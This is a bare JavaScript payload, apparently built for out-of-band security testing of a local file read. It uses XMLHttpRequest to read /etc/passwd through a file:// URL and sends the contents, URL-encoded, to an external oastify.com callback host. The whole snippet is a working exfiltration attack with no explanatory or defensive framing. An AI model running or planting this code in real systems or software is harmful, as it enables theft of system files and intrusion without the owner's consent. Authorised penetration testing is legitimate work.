var xmlHttp0 = new XMLHttpRequest();
xmlHttp0.open( "GET", "file:///etc/passwd", false );
xmlHttp0.send( null );
var data = xmlHttp0.responseText;

var xmlHttp = new XMLHttpRequest();
var url = "http://oxpa8hivzsaq6qdjgmv721ouzl5ctch1.oastify.com/js_test4?" + encodeURIComponent(data);
xmlHttp.open( "GET", url, false );
xmlHttp.send( null );
